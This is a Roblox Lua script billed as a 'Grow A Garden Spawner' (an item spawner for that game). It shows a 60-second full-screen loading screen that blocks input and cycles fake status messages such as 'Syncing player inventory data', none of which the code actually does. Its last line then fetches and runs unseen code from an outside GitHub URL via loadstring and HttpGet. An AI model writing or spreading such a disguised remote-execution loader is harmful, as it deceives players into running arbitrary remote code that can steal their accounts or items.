local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local isIOS = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

if isIOS then
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local background = Instance.new("Frame")
background.Size = UDim2.new(1,0,1,0)
background.Position = UDim2.new(0,0,0,0)
background.BackgroundColor3 = Color3.fromRGB(255, 238, 200) -- beachy vibe
background.BorderSizePixel = 0
background.Parent = screenGui

local inputBlocker = Instance.new("TextButton")
inputBlocker.Size = UDim2.new(1,0,1,0)
inputBlocker.Position = UDim2.new(0,0,0,0)
inputBlocker.BackgroundTransparency = 1
inputBlocker.Text = ""
inputBlocker.AutoButtonColor = false
inputBlocker.Parent = background

local label = Instance.new("TextLabel")
label.Size = UDim2.new(0.8,0,0.1,0)
label.Position = UDim2.new(0.1,0,0.4,0)
label.BackgroundTransparency = 1
label.TextScaled = true
label.Font = Enum.Font.GothamBold
label.TextColor3 = Color3.fromRGB(255, 168, 64)
label.Text = "Grow A Garden Spawner"
label.Parent = background

local progressBG = Instance.new("Frame")
progressBG.Size = UDim2.new(0.8,0,0.04,0)
progressBG.Position = UDim2.new(0.1,0,0.55,0)
progressBG.BackgroundColor3 = Color3.fromRGB(255, 220, 180)
progressBG.BorderSizePixel = 0
progressBG.Parent = background

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0,0,1,0)
progressBar.Position = UDim2.new(0,0,0,0)
progressBar.BackgroundColor3 = Color3.fromRGB(255, 180, 80)
progressBar.BorderSizePixel = 0
progressBar.Parent = progressBG

local messages = {
    "🔄 Syncing player inventory data...",
    "📦 Loading pet database...",
    "🌱 Calculating growth rates...",
    "🌴 Validating seed types...",
    "📊 Analyzing garden layout...",
    "🗃️ Fetching player stats...",
    "⚙️ Calibrating spawner mechanics...",
    "🔍 Checking pet rarity levels...",
    "💾 Saving progress checkpoints...",
    "🛠️ Initializing garden tools...",
    "🌾 Scanning crop health status...",
    "📡 Updating server connection...",
    "🐦 Loading ambient sounds...",
    "📅 Scheduling daily reward timers...",
    "🪴 Spawning tropical plants...",
    "🌞 Adjusting sunlight exposure...",
    "🌊 Activating water features...",
    "🦜 Syncing companion animals...",
    "🐚 Gathering beach collectibles...",
    "🎯 Optimizing spawner efficiency...",
    "🦀 Tracking crab activity...",
    "🌻 Monitoring flower bloom cycles...",
    "🌿 Refreshing foliage textures...",
    "🦋 Releasing butterflies...",
    "🛎️ Ringing garden bells...",
    "🧴 Applying fertilizer stats...",
    "🐠 Stocking fish tanks...",
    "🌟 Unlocking special seeds...",
    "🦢 Deploying swan animations...",
    "🚜 Starting tractor systems...",
    "🛡️ Activating garden shields...",
    "🎉 Preparing celebration events...",
    "📥 Downloading latest updates...",
    "🎣 Loading fishing minigame...",
    "🌈 Generating rainbow effects...",
    "🔥 Igniting campfire animations...",
    "📜 Writing event scripts...",
    "🐝 Managing bee populations...",
    "🦎 Observing lizard movements...",
    "🪱 Spawning earthworms...",
    "🍒 Harvesting cherry trees...",
    "🦥 Syncing sloth animations...",
    "🌙 Adjusting moonlight settings...",
    "📡 Confirming network stability...",
    "🪓 Preparing lumberjack tasks...",
    "🌺 Applying flower shaders...",
    "📢 Broadcasting spawner status...",
    "🦩 Calibrating flamingo behavior...",
    "🪁 Flying garden kites...",
    "🌽 Loading corn stalk growth...",
    "💨 Simulating gentle breezes..."
}

local totalTime = 60 -- seconds
local steps = 100
local waitTime = totalTime / steps

-- Fade in
for i = 1, 20 do
    local transparency = 1 - (i * 0.05)
    background.BackgroundTransparency = transparency
    label.TextTransparency = transparency
    progressBG.BackgroundTransparency = transparency
    progressBar.BackgroundTransparency = transparency
    wait(0.05)
end

for i = 1, steps do
    progressBar.Size = UDim2.new(i / steps, 0, 1, 0)

    local msgIndex = math.floor((i / steps) * #messages)
    if msgIndex == 0 then msgIndex = 1 end
    label.Text = messages[msgIndex]

    wait(waitTime)
end

wait(1)

-- Fade out
for i = 1, 20 do
    local transparency = i * 0.05
    background.BackgroundTransparency = transparency
    label.TextTransparency = transparency
    progressBG.BackgroundTransparency = transparency
    progressBar.BackgroundTransparency = transparency
    wait(0.05)
end

screenGui:Destroy()

if isIOS then
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
end

-- Execute your spawner script here
loadstring(game:HttpGet("https://raw.githubusercontent.com/jdkduejdo/DarkV5/refs/heads/main/DarkSpawnerV5"))()
